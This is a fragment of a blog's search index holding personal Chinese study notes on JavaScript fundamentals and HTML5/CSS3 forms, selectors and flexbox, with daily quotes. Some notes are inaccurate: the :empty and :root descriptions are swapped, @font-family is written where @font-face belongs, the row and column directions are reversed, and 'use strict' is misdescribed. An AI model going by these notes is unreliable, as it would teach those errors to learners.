undefined。<br>为了使代码简洁易懂，建议在函数中主要使用局部变量和参数，而不是外部变量<br>获取参数、使用参数并返回结果的函数更容易理解。<br>一个好的函数名能够让我们马上知道这个函数的功能是什么，会返回什么。<br>一个单独的函数不仅更容易测试和调试 —— 它的存在本身就是一个很好的注释！</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>一月添香<br>二月夜未央<br>三月情诗慌张<br>四月对镜补红妆<br>五月相携游马十方<br>六月日日笙歌抛流光<br>七月为卿斟唱曲水流觞<br>八月年华辗转处陌上成双<br>九月田中百花争艳怜意满腔<br>十月眠里光阴归去思念倾满江<br>十一月冬雷阵阵我笑悲歌不恸上苍<br>十二月天寒地冻凭楼伫等把痴梦熬荒<br>可叹，人间再无双</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221102</title>
      <link href="/2022/11/02/b-16/"/>
      <url>/2022/11/02/b-16/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h4><h5 id="一，if"><a href="#一，if" class="headerlink" title="一，if"></a>一，if</h5><p>括号里的条件表达式计算结果是 true，就会执行对应的代码块<br>如果有多个语句要执行，我们必须将要执行的代码块封装在大括号内</p><h5 id="二，布尔转换"><a href="#二，布尔转换" class="headerlink" title="二，布尔转换"></a>二，布尔转换</h5><p>if语句会计算圆括号内的表达式，并将计算结果转换为布尔型<br>数字0、空字符串””、null、undefined和NaN都会被转换成false。因为它们被称为“假值（falsy）”。<br>其他值被转换为 true，所以它们被称为“真值（truthy）”。</p><h5 id="三，else"><a href="#三，else" class="headerlink" title="三，else"></a>三，else</h5><p>if 语句判断条件不成立，就会执行它内部的代码</p><h5 id="四，多个条件"><a href="#四，多个条件" class="headerlink" title="四，多个条件"></a>四，多个条件</h5><pre><code>let year = prompt(&#39;提示语&#39;, &#39;&#39;);            #设置变量并赋值                                            #prompt相当于inputif (year &lt; 2015) &#123;                          #判断条件  alert( &#39;Too early...&#39; );                  #成立就执行alert，相当于print&#125; else if (year &gt; 2015) &#123;                   #另一个条件判断  alert( &#39;Too late&#39; );&#125; else &#123;                                    #若上面的条件都不满足  alert( &#39;Exactly!&#39; );&#125;                                           #大括号要把整个if语句的执行部分都包含起来</code></pre><h5 id="五，条件运算符"><a href="#五，条件运算符" class="headerlink" title="五，条件运算符?"></a>五，条件运算符?</h5><p>(有时被称为三元运算符,因为该运算符中有三个操作数,它是 JavaScript 中唯一一个有这么多操作数的运算符)<br>根据一个条件去赋值一个变量</p><pre><code>let result = condition ? value1 : value2;计算条件结果，如果结果为真，则返回 value1，否则返回 value2。condition(条件判断)尽量用括号包起来注意空格</code></pre><h5 id="六，多个"><a href="#六，多个" class="headerlink" title="六，多个?"></a>六，多个?</h5><pre><code>let age = prompt(&#39;age?&#39;, 18);let message = (age &lt; 3) ? &#39;Hi, baby!&#39; :  (age &lt; 18) ? &#39;Hello!&#39; :  (age &lt; 100) ? &#39;Greetings!&#39; :  &#39;What an unusual age!&#39;;alert( message );相当于if (age &lt; 3) &#123;  message = &#39;Hi, baby!&#39;;&#125; else if (age &lt; 18) &#123;  message = &#39;Hello!&#39;;&#125; else if (age &lt; 100) &#123;  message = &#39;Greetings!&#39;;&#125; else &#123;  message = &#39;What an unusual age!&#39;;&#125;</code></pre><h5 id="七，-的非常规使用"><a href="#七，-的非常规使用" class="headerlink" title="七，?的非常规使用"></a>七，?的非常规使用</h5><pre><code>有时可以使用问号 ? 来代替 if 语句：let company = prompt(&#39;Which company created JavaScript?&#39;, &#39;&#39;);(company == &#39;Netscape&#39;) ?   alert(&#39;Right!&#39;) : alert(&#39;Wrong.&#39;);注意缩进</code></pre><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><h5 id="（或）"><a href="#（或）" class="headerlink" title="||（或）"></a>||（或）</h5><p>任意一个参数为 true，返回的结果就为 true，否则返回 false<br>如果操作数不是布尔值，那么它将会被转化为布尔值来参与运算<br>例如 1 被作为 true 处理， 0 则被作为 false</p><h5 id="amp-amp-（与）"><a href="#amp-amp-（与）" class="headerlink" title="&amp;&amp;（与）"></a>&amp;&amp;（与）</h5><p>两个操作数都是真值时，与运算返回 true，否则返回 false<br>函数 alert 返回了 undefined,所以会运算并输出alert然后停止</p><h5 id="（非）"><a href="#（非）" class="headerlink" title="!（非）"></a>!（非）</h5><p>将操作数转化为布尔类型：true/false<br>返回相反的值<br>!! 有时候用来将某个值转化为布尔类型<br>(第一个非运算将该值转化为布尔类型并取反，第二个非运算再次取反。就得到了布尔值的转化)</p><h5 id="（空值合并运算符）"><a href="#（空值合并运算符）" class="headerlink" title="??（空值合并运算符）"></a>??（空值合并运算符）</h5><p>a ?? b 的结果是：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一个参数不是 null/undefined，则返回第一个参数，否则返回第二个参数</p><h5 id="拓展用法"><a href="#拓展用法" class="headerlink" title="拓展用法:"></a>拓展用法:</h5><p>||寻找第一个真值,&amp;&amp;寻找第一个假值</p><p>原理:一个或运算 || 的链，将返回第一个真值，如果不存在真值，就返回该链的最后一个值<br>运用:(a)获取变量列表或者表达式中的第一个真值<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(b)短路求值<br>注意:  &amp;&amp; 的优先级比或 || 要高<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不要用 || 或 &amp;&amp; 来取代 if<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非运算符 ! 的优先级在所有逻辑运算符里面最高<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;?? 运算符的优先级与 || 相同<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;??返回第一个已定义的值</p><h4 id="请加上括号！！！"><a href="#请加上括号！！！" class="headerlink" title="请加上括号！！！"></a>请加上括号！！！</h4><h3 id="训练-登录校验"><a href="#训练-登录校验" class="headerlink" title="训练(登录校验)"></a>训练(登录校验)</h3><pre><code>let firstName = null;let lastName = null;let nickName = &quot;Supercoder&quot;;// 显示第一个已定义的值：alert(firstName ?? lastName ?? nickName ?? &quot;匿名&quot;);let userName = prompt(&quot;Who&#39;s there?&quot;, &#39;&#39;);if (userName === &#39;Admin&#39;) &#123;  let pass = prompt(&#39;Password?&#39;, &#39;&#39;);  if (pass === &#39;TheMaster&#39;) &#123;    alert( &#39;Welcome!&#39; );  &#125; else if (pass === &#39;&#39; || pass === null) &#123;    alert( &#39;Canceled&#39; );  &#125; else &#123;    alert( &#39;Wrong password&#39; );  &#125;&#125; else if (userName === &#39;&#39; || userName === null) &#123;  alert( &#39;Canceled&#39; );&#125; else &#123;  alert( &quot;I don&#39;t know you&quot; );&#125;</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。"><a href="#人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。" class="headerlink" title="人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。"></a>人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221101</title>
      <link href="/2022/11/01/b-15/"/>
      <url>/2022/11/01/b-15/</url>
      
        <content type="html"><![CDATA[<h4 id="从今天开始学习JavaScript啦！"><a href="#从今天开始学习JavaScript啦！" class="headerlink" title="从今天开始学习JavaScript啦！"></a>从今天开始学习JavaScript啦！</h4><h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>1.概念<br>&nbsp; &nbsp; 这种编程语言写出来的程序被称为脚本。它们可以被直接写在网页的 HTML 中，在页面加载的时候自动执行。<br>&nbsp; &nbsp; 脚本被以纯文本的形式提供和执行。它们不需要特殊的准备或编译即可运行。<br>2.JavaScript 引擎<br>&nbsp; &nbsp;首先，引擎（如果是浏览器，则引擎被嵌入在其中）读取（“解析”）脚本。<br>&nbsp; &nbsp;然后，引擎将脚本转化（“编译”）为机器语言。<br>&nbsp; &nbsp;然后，机器代码快速地执行。<br>3.作用<br>&nbsp; &nbsp;JavaScript 可以做与网页操作、用户交互和 Web 服务器相关的所有事情。<br>4.局限性<br>&nbsp; &nbsp;(1)网页中的 JavaScript 没有直接访问操作系统的功能。<br>&nbsp; &nbsp;(2)不同的标签页/窗口之间通常互不通信(“同源策略”)为了解决“同源策略”问题，两个标签页必须&lt;都&gt;包含一些处理这个问题的特定的 JavaScript 代码，并均允许数据交换。<br>&nbsp; &nbsp;(3)可以轻松地通过互联网与当前页面所在的服务器进行通信</p><h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><pre><code>1.markup(标签)   type 特性：&lt;script type=…&gt;                                           #已不需要   language 特性：&lt;script language=…&gt;                                   #已不需要2.外部脚本   将大量的 JavaScript 代码放入一个单独的文件。   脚本文件可以通过 src 特性（attribute）添加到 HTML 文件中。   使用独立文件的好处是浏览器会下载它，然后将它保存到浏览器的 缓存 中。   之后，其他页面想要相同的脚本就会从缓存中获取，而不是下载它。所以文件实际上只会下载一次。   这可以节省流量，并使得页面（加载）更快。   &lt;script src=&quot;路径&quot;&gt;&lt;/script&gt;                                        #要附加多个脚本，请使用多个标签   注意:如果设置了 src 特性，script 标签内容将会被忽略。3.语句   在代码中编写任意数量的语句。语句之间可以使用;进行分割。                #可以放在一行或多行   当存在换行符时，在大多数情况下可以省略分号(自动分号插入)4.注释   单行注释以两个正斜杠字符 // 开始。                                    #Ctrl+/快捷键   /* 多行注释*/5.现代模式(&quot;use strict&quot;)   &quot;use strict&quot; 出现在脚本的最顶部,保证旧的功能能够使用</code></pre><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>1.概念   let message;                                                        #创建（声明或者定义）一个名称为“message”的变量   message = &#39;Hello&#39;;                                                  #为变量添加一些数据2.变量命名限制   首字符必须非数字   变量名称必须仅包含字母、数字、符号 $ 和 _   可以将变量定义和赋值合并成一行,也可以在一行中声明多个变量   对于确定不变的变量尽量使用大写3.常数变量   声明一个常数（不变）变量，可以使用const而非let</code></pre><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><pre><code>1.Number 类型   包括整数，浮点数和特殊数值(Infinity、-Infinity 和 NaN)   NaN代表计算错误。它是不正确或者未定义的数学操作所得到的结果,任何对NaN的进一步数学运算都会返回NaN,除了NaN**0=12.BigInt 类型   BigInt用于表示任意长度的整数。可以通过将n附加到整数字段的末尾来创建BigInt值。3.String 类型   字符串必须被括在引号里(单双引号无区别，反引号是功能扩展，允许我们通过将变量和表达式包装在$&#123;…&#125;中)   在反引号内$&#123;…&#125;的表达式会被计算4.Boolean 类型(逻辑类型)   仅包含两个值true和false   布尔值也可作为比较的结果5.null 值   null值不属于上述任何一种类型,它构成了一个独立的类型，只包含 null 值   null仅仅是一个代表“无”、“空”或“值未知”的特殊值6.undefined 值   特殊值undefined和null一样自成类型,undefined的含义是未被赋值   如果一个变量已被声明，但未被赋值，那么它的值就是 undefined   通常使用null将一个“空”或者“未知”的值写入变量，而undefined则保留作为未进行初始化的事物的默认初始值7.Object 类型   object 用于储存数据集合和更复杂的实体8.Symbol 类型   symbol 类型用于创建对象的唯一标识符9..typeof 运算符   typeof 运算符以字符串的形式返回数据类型注:typeof null的结果为&quot;object&quot;。这是官方承认的typeof的错误   typeof alert的结果是&quot;function&quot;,因为alert在JavaScript语言中是一个函数,   函数隶属于object类型。但是typeof会对函数区分对待，并返回&quot;function&quot;   typeof(x)与typeof x相同</code></pre><h4 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h4><pre><code>alert   alert(&quot;Hello&quot;);   显示模态窗(modal) ,直到他们处理完窗口prompt   result = prompt(title, [default]);   显示一个带有文本消息的模态窗口，还有input框和确定/取消按钮   title是显示给用户的文本，default是指定input框的初始值。 (中括号可去)   不提供default的话，浏览器会把undefined插入到prompt   prompt将返回用户在input框内输入的文本，如果用户取消了输入，则返回null   显示一个带有文本消息的模态窗口，还有input框和确定/取消按钮confirm   result = confirm(question);   显示一个带有question以及确定和取消两个按钮的模态窗口。   点击确定返回true,点击取消返回false。限制性:    模态窗口的确切位置由浏览器决定。通常在页面中心。    窗口的确切外观也取决于浏览器。我们不能修改它。</code></pre><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><p>字符串转换&nbsp;&nbsp;x = String(x);<br>数字型转换&nbsp;&nbsp;Number(x)x<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;字符串变成NaN(存在字符)或0(除换行符\n制表符\t外为空)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined变成NaN<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;null变成0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;true 和 false变成1 and 0<br>布尔型转换&nbsp;&nbsp;Boolean(x)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直观上为“空”的值（如 0、空字符串、null、undefined 和 NaN）将变为 false。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其他值变成 true。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非空的字符串总是 true(PHP等语言视 “0” 为 false而js不是)</p><p>自动转换:<br>&nbsp;&nbsp;&nbsp;&nbsp;运算符和函数会自动将赋予它们的值转换为正确的类型<br>&nbsp;&nbsp;&nbsp;&nbsp;alert会自动将任何值都转换为字符串以进行显示;算术函数和表达式中会自动进行number类型转换</p><h4 id="基础运算符，数学运算"><a href="#基础运算符，数学运算" class="headerlink" title="基础运算符，数学运算"></a>基础运算符，数学运算</h4><h5 id="详见知识点"><a href="#详见知识点" class="headerlink" title="详见知识点"></a>详见<a href="https://zh.javascript.info/operators#yong-er-yuan-yun-suan-fu-lian-jie-zi-fu-chuan">知识点</a></h5><p>1.加号 + 用于求和<br>&nbsp;&nbsp;&nbsp;应用于字符串，连接各个字符串<br>&nbsp;&nbsp;&nbsp;只要任意一个运算元是字符串，那么另一个运算元也将被转化为字符串</p><p>2.数字转化，一元运算符 +<br>&nbsp;&nbsp;&nbsp;+ 应用于单个值，对数字没有任何作用。但是如果运算元不是数字，加号 + 则会将其转化为数字<br>&nbsp;&nbsp;&nbsp;效果和 Number(…) 相同，但是更加简短</p><p>3.<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence">运算符优先级</a><br>&nbsp;&nbsp;&nbsp;一元运算符优先级高于二元运算符</p><p>4.其他运算方式<br>&nbsp;&nbsp;&nbsp;链式赋值 a = b = c = 2;<br>&nbsp;&nbsp;&nbsp;原地修改 n += 5;<br>&nbsp;&nbsp;&nbsp;自增/自减counter++;相当于counter = counter + 1;<br>&nbsp;&nbsp;&nbsp;自增/自减只能应用于变量，应用于数值（比如 5++）会报错<br>&nbsp;&nbsp;&nbsp;运算符 ++ 和 – 可以置于变量前，也可以置于变量后。<br>&nbsp;&nbsp;&nbsp;++和–放在前面使用的是自增后的值，放在后面是自增前的值<br>&nbsp;&nbsp;&nbsp;位运算符及<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Expressions_and_Operators#bitwise_operators">位操作符</a>:按位与 ( &amp; )按位或 ( | )按位异或 ( ^ )按位非 ( ~ )左移 ( &lt;&lt; )右移 ( &gt;&gt; )无符号右移 ( &gt;&gt;&gt; )<br>&nbsp;&nbsp;&nbsp;逗号运算符丢弃逗号前的结果，保留逗号后的</p><h4 id="值的比较"><a href="#值的比较" class="headerlink" title="值的比较"></a>值的比较</h4><p>一，比较结果为 Boolean 类型<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所有比较运算符均返回布尔值<br>二，字符串比较<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;按字符（母）逐个进行比较的<br>三，不同类型间的比较<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;先将其转化为数字再判定大小(true 会被转化为 1、false 转化为 0)<br>四，严格相等<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;严格相等运算符 === 在进行比较时不会做任何的类型转换(属于不同的数据类型就立刻返回 false)<br>五，比较 null 和 undefined<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;严格相等 === 比较二者时false<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非严格相等 == 比较二者时true<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数学式或其他比较方法 &lt; &gt; &lt;= &gt;= 时null 被转化为 0，undefined 被转化为 NaN<br>六，其它<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;null 会被转化为0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined 在比较中被转换为了 NaN，而 NaN 是一个特殊的数值型值，它与任何值进行比较都会返回 false<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined 只与 null 相等</p><h4 id="总结问题"><a href="#总结问题" class="headerlink" title="总结问题"></a>总结问题</h4><pre><code>比较运算符始终返回布尔值。字符串的比较，会按照“词典”顺序逐字符地比较大小。当对不同类型的值进行比较时，它们会先被转化为数字（不包括严格相等检查）再进行比较。在非严格相等 == 下，null 和 undefined 相等且各自不等于任何其他的值。在使用 &gt; 或 &lt; 进行比较时，需要注意变量可能为 null/undefined 的情况。比较好的方法是单独检查变量是否等于 null/undefined。对于取值可能是 null/undefined 的变量，请按需要分别检查它的取值情况。除了严格相等 === 外，其他但凡是有 undefined/null 参与的比较，我们都需要格外小心。除非你非常清楚自己在做什么，否则永远不要使用 &gt;= &gt; &lt; &lt;= 去比较一个可能为 null/undefined 的变量。</code></pre><h2 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h2><h4 id="一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。"><a href="#一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。" class="headerlink" title="一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。"></a>一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。</h4>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221031</title>
      <link href="/2022/10/31/b-14/"/>
      <url>/2022/10/31/b-14/</url>
      
        <content type="html"><![CDATA[<h1 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h1><h3 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h3><pre><code>&lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;man&quot;&gt;&lt;label for=&quot;man&quot;&gt;男&lt;/label&gt;这里做一个补充:id是为了点击文字也可以选中，不然就只能点击那个圈来选了回归正轨1.type=&quot;checkbox&quot;可以多选2.type=&quot;checkbox&quot; checked=&quot;checked&quot;就能变成默认选中3.disabled=&quot;disabled&quot;或者disabled可以禁用该模块4.readonly是只读不能改</code></pre><h3 id="下拉菜单"><a href="#下拉菜单" class="headerlink" title="下拉菜单"></a>下拉菜单</h3><pre><code>&lt;body&gt;    &lt;select size=&quot;3&quot; multiple&gt;                              #size是一面可显示的选项  multiple是可多选        &lt;option value=&quot;a&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;b&quot;&gt;&lt;/option&gt;                         #value是提供给后端使用的value值        &lt;option value=&quot;c&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;d&quot; selected&gt;&lt;/option&gt;                #selected默认选中    &lt;/select&gt;&lt;/body&gt;</code></pre><h3 id="文本域-多行文本输入框"><a href="#文本域-多行文本输入框" class="headerlink" title="文本域(多行文本输入框)"></a>文本域(多行文本输入框)</h3><pre><code>&lt;div&gt;    &lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;10&quot; placeholder=&quot;&quot;&gt;内容&lt;/textarea&gt;&lt;/div&gt;cols是列   rows是行placeholder是预置文本，输入就会消失&lt;style&gt;    textarea&#123;        width:100px;        height:100px;        resize:vertical;    &#125;&lt;/style&gt;horizontal水平可调节both都可以none不能更改注意:placeholder的默认value是两个标识符之间的，换行也会跟着换行</code></pre><h3 id="字段集"><a href="#字段集" class="headerlink" title="字段集"></a>字段集</h3><pre><code>&lt;fieldset&gt;    &lt;legend&gt;内容1&lt;/legend&gt;    &lt;input type=&quot;radio&quot; name=&quot;aaa&quot;&gt;选项1    &lt;input type=&quot;radio&quot; name=&quot;aaa&quot;&gt;选项2    &lt;legend&gt;内容2&lt;/legend&gt;&lt;/fieldset&gt;</code></pre><h2 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h2><p>1.指定UTF-8<br>2.增加语义化标签(便于爬虫)<br>&nbsp;&nbsp; section,article,aside,header,footer,nav,figure,main<br>3.可以省略结束标签(最好不要)<br>4.在标签中可以使用单引号<br>5.音视频标签</p><pre><code>&lt;body&gt;    &lt;audio src=&quot;路径&quot; cintrols&gt;&lt;/audio&gt;    &lt;video src=&quot;路径&quot; poster=&quot;路径&quot;&gt;&lt;/video&gt;&lt;/body&gt;controls 可控制loop 循环autoplay 自动播放muted 静音播放poster 海报注意:设置宽高要适应视频画面大小</code></pre><h3 id="表单增强-以上传后端为例"><a href="#表单增强-以上传后端为例" class="headerlink" title="表单增强(以上传后端为例)"></a>表单增强(以上传后端为例)</h3><pre><code>一，颜色选择&lt;form action=&quot;action&quot;&gt;    &lt;input type=&quot;color&quot; name=&quot;aaa&quot; autofocus&gt;            #选择颜色，autofocus光标默认在这里    &lt;input type=&quot;email&quot; name=&quot;mymail&quot; required&gt;          #选择邮箱，required必填项    &lt;input type=&quot;url&quot; name=&quot;bbb&quot; multiple&gt;               #选择地址，multiple可选择多个地址，用逗号隔开    &lt;input type=&quot;tel&quot; name=&quot;ccc&quot;&gt;                        #tel只在手机端有用，显示输入页面    &lt;input type=&quot;range&quot; name=&quot;ddd&quot; min=&quot;100&quot; max=&quot;1000&quot; value=&quot;100&quot; step=&quot;10&quot;&gt;    #range滑块效果    &lt;input type=&quot;number&quot; name=&quot;eee&quot; min=&quot;0&quot; max=&quot;10&quot; value=&quot;4&quot; step=&quot;2&quot;&gt;          #选择数字，value是初始数据    &lt;input type=&quot;search&quot; name=&quot;fff&quot;&gt;                     #搜索框    &lt;input type=&quot;date&quot; name=&quot;ggg&quot;&gt;                       #选择日期，type改成month是精确到月份    &lt;input type=&quot;datetime-local&quot; name=&quot;hhh&quot;&gt;             #精确到秒&lt;/form&gt;注意！！！没有name就不能传到后端，提交了会在url上显示二，数据列表&lt;body&gt;    &lt;input type=&quot;text&quot; list=&quot;mylist&quot;&gt;              这里的list    &lt;datalist id=&quot;mylist&quot;&gt;                         和这里的id关联        &lt;option value=&quot;111111&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;2433445&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;333436653&quot;&gt;&lt;/option&gt;        上面输入就可以在下面显示有关的内容        &lt;option value=&quot;4、3、78&quot;&gt;&lt;/option&gt;    &lt;/datalist&gt;&lt;/body&gt;三，正则表达式在input中加入 pattern=&quot;[0-9][A-Z]&#123;3&#125;&quot;代表第一个要是0-9的，后面接着三个要是A-Z的</code></pre><h2 id="CSS3"><a href="#CSS3" class="headerlink" title="CSS3"></a>CSS3</h2><h4 id="选择器回顾-更新"><a href="#选择器回顾-更新" class="headerlink" title="选择器回顾+更新"></a>选择器回顾+更新</h4><pre><code>一，层级选择器+属性选择器&lt;style&gt;    .child+li&#123;                       #这个child后面的第一个同级的li标签改变        background:red;            &#125;    .child~li&#123;                       #这个后面所有同级的li标签都改变        background:red;    &#125;    div[class]&#123;                      #所有div而且有class的都改变        background:red;    &#125;    div [class]&#123;                     #加了空格，div后代有class的都改变        background:red;    &#125;    div[class=box1]&#123;                 #是div而且属性是box1的才改变        background:red;    &#125;&lt;/style&gt;拓展————模糊匹配:class^&quot;b&quot;   以b开头的class$&quot;b&quot;   以b结尾的class*&quot;b&quot;   包含b的二，结构伪类选择器&lt;style&gt;    ul li:first-child&#123;       #选择第一个        color:red;    &#125;    ul li:last-child&#123;        #最后一个        color:red;    &#125;    li:nth-child(odd)&#123;       #选定第几个，odd/2n+1/2n-1是奇数，2n/even是偶数        color:red;    &#125;    li:nth-onlychild&#123;        #匹配div下而且只有一个p的        color:red;    &#125;    div:empty&#123;               #匹配根元素(HTML)        color:red;    &#125;    :root,body&#123;              #匹配没有任何元素的，包括空格        color:red;    &#125;&lt;/style&gt;三，目标伪类选择器div.&#123;                        #先让全部使用一个style    display:none;&#125;div.:target&#123;                 #再让点到的目标换成指定的style    display:block;&#125;四，UI状态伪类选择器input:checked&#123;               #匹配选择的    background:red;  &#125;        input:focus&#123;         #匹配手动focus的    background:red;&#125;四，否定伪类选择器li:not(:nth-child(2n+1))&#123;    #匹配所有不匹配的    color:red;&#125;其它:X:link  链接伪类选择器，超链接未被访问过的X:visited  链接伪类选择器，超链接被访问过的X:active  用户行为选择器，被激活的(常用于链接)X:hover  用户行为选择器，停留在上方的</code></pre><h3 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h3><pre><code>文本阴影div&#123;    text-shadow:10px -10px 1px red;     #水平方向，垂直方向，模糊程度，阴影颜色&#125;如果要多个阴影，在颜色后面加逗号之后再加上另一个的参数，分号不要漏!!!盒子阴影div&#123;    width:100px;    ...    box-shadow: 10px(水平) 10px(垂直) 1px(模糊程度) 10px(阴影大小) red inside(内阴影);&#125;</code></pre><h3 id="圆角边框-放在style里"><a href="#圆角边框-放在style里" class="headerlink" title="圆角边框(放在style里)"></a>圆角边框(放在style里)</h3><p>同时设置四个角:<br>border-radius:10px;<br>1.从四个角往内截10px(可以使用百分比)<br>2.设置一个值，四个角一样<br>3.设置两个值，左上右下——&gt;左下右上<br>4.设置三个值，左上——&gt;左下右上——&gt;右下<br>5.设置四个值，左上开始顺时针</p><p>设置单个角:<br>boder-top-left-radius:10px;<br>boder-top-right-radius:10px;<br>boder-bottom-left-radius:10px;<br>boder-bottom-right-radius:10px;</p><p>border-radius:10px/20px;<br>水平/垂直切割，只支持boder-radius</p><h3 id="字体引入"><a href="#字体引入" class="headerlink" title="字体引入"></a>字体引入</h3><pre><code>&lt;style&gt;    @font-family:kerwin;                   #字体名字    src:url(font/STHUPO.TTF);              #字体文件路径    div&#123;        font-family:kerwin;                #字体名字        font-size:50px;               color:red;        text-shadow:5px 0px 0px green;    &#125;&lt;/style&gt;</code></pre><h3 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h3><h4 id="怪异盒模型"><a href="#怪异盒模型" class="headerlink" title="怪异盒模型"></a>怪异盒模型</h4><p>box-sizing: content-box;      #普通盒模型，增加padding时会扩张box<br>box-sizing: border-box;       #怪异盒模型，增加时不会撑大</p><h4 id="弹性盒模型-能够适应页面"><a href="#弹性盒模型-能够适应页面" class="headerlink" title="弹性盒模型(能够适应页面)"></a>弹性盒模型(能够适应页面)</h4><p>display:flex;<br>1.默认横向排列，不是浮动。<br>2.行内元素变为块级元素。<br>3.margin:auto;自动居中<br>4.flex-direction: column;<br>5.column主轴列向排列，row纵向排列;column-reverse；纵向倒序排列，row-reverse横向倒序排列<br>6.justify-content:flex-end;主轴位置<br>align-items:center;侧轴位置<br>7.flex-start靠左对齐;flex-end靠右对齐;center靠中对齐;space-around环绕;space-between两端对齐</p><h4 id="折行与行间距"><a 